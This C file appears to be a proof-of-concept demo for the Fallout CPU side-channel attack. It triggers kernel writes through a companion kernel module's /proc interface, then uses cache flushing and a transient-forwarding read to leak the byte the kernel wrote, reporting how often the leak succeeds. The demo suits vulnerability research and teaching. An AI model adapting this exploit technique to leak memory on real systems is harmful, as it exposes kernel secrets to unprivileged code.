#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <unistd.h>
#include "../primitives/basic_primitives.h"
#define REPS 20000
#define PROC_FILENAME "/proc/fallout_interface"

static inline uint64_t rdtsc() {
    uint64_t a = 0, d = 0;
    asm volatile("mfence");
#if defined(USE_RDTSCP) && defined(__x86_64__)
    asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
#elif defined(USE_RDTSCP) && defined(__i386__)
    asm volatile("rdtscp" : "=A"(a), :: "ecx");
#elif defined(__x86_64__)
    asm volatile("rdtsc" : "=a"(a), "=d"(d));
#elif defined(__i386__)
    asm volatile("rdtsc" : "=A"(a));
#endif
    a = (d << 32) | a;
    asm volatile("mfence");
    return a;
}

volatile int main(int argc, char** args){
    if(!fallout_compatible()){
        printf("Your Processor Architecture is not supported by this demo!\n");
        return 1;
    }
    if(access(PROC_FILENAME, F_OK)){
        printf("The Fallout kernel module does not seem to be loaded. Make sure that you load 'kernel_module/fallout_module.ko' before running this demo!\n");
        return 1;
    }
    int* stats = malloc(sizeof(stats[0]) * 256);
    memset(stats, 0, sizeof(uint8_t) * 256);
    printf("Demo 3: Observing kernel writes\n");
    int page_size = getpagesize();
    uint8_t *mem = aligned_alloc(page_size,page_size * 256);
    memset(mem, 0xFF, page_size * 256);
    int reps = REPS, success = 0;
    fallout_init();
    int procfile = open(PROC_FILENAME, O_RDONLY);
    uint8_t* response_buffer = malloc(sizeof(unsigned int));

    printf("Attempting %d random reads...\n", reps);
    unsigned int kernel_number, offset = 0xFF0, result;
    while (reps--){
        /*read(procfile, response_buffer, sizeof(unsigned int));
        kernel_number = *((unsigned int*)response_buffer);
        result = wtf(mem, kernel_number % page_size);
        success += result == (kernel_number >> 12) % 256;
        stats[result] += 1;
        //printf("%x-%x, ", result, (kernel_number >> 12) % 256);*/
        //uint8_t* secret_buffer = aligned_alloc(page_size, page_size);
        flush_cache(mem);
        //uint64_t time = rdtsc();
        read(procfile, response_buffer, sizeof(unsigned int));
        //time = rdtsc() - time,
        //secret_buffer[101] = 42;
        result = wtf(mem, offset);
        stats[result] += 1;
        success += result == 0x88;
        //printf("%lu, ", time);
        //free(secret_buffer);

    }
    close(procfile);
    free(response_buffer);
    printf("%d of %d reads succeeded.\nSuccess rate: %.2f %%\n", success, REPS, ((double) success * 100) / REPS);
    int max_i = 0;
    int max = stats[0];
    for(int i = 0; i < 256; i++){
        if(stats[i] > max){
            max = stats[i];
            max_i = i;
        }
    }
    printf("Most common result: 0x%x, %d times.\n", max_i, max);
    printf("0x88 hits: %d times.\n", stats[0x88]);
    fallout_cleanup();
    return 0;
}

